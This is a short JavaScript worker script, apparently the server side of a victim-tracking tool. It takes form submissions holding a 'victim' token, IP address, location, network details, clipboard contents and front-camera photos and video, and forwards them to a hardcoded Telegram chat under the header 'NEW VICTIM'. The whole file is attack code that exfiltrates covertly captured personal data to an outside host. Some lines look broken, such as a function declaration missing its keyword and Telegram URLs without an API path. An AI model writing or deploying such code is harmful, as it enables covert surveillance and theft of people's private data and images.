addEventListener('fetch', e => e.respondWith(handle(e.request)));

async handle(req) {
  if (req.method !== 'POST') return new Response('ok');

  const fd = await req.formData();
  const token = fd.get('token');
  const ip = fd.get('ip');
  const ua = fd.get('ua');
  const loc = fd.get('loc');
  const net = fd.get('net');
  const clip = fd.get('clipboard');
  const front = fd.get('front');
  const back = fd.get('back');
  const vid = fd.get('video');

  const txt = `🎯 NEW VICTIM\nSlug: ${token}\nIP: ${ip}\nLoc: ${loc}\nNet: ${net}\nClipboard: ${clip}`;

  // 1. Send Text Data
  await fetch(`https://api.telegram.org`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: '6671784926',
      text: txt
    })
  });

  // 2. Send Photo (if exists)
  if (front) {
    const photoFd = new FormData();
    photoFd.append('chat_id', '6671784926');
    photoFd.append('photo', front, token + '_front.jpg');

    await fetch(`https://api.telegram.org`, {
      method: 'POST',
      body: photoFd
    });
  }

  // 3. Send Video (if exists)
  if (vid) {
    const videoFd = new FormData();
    videoFd.append('chat_id', '6671784926');
    videoFd.append('video', vid, token + '.webm');

    await fetch(`https://api.telegram.org`, {
      method: 'POST',
      body: videoFd
    });
  }

  return new Response('ok');
}
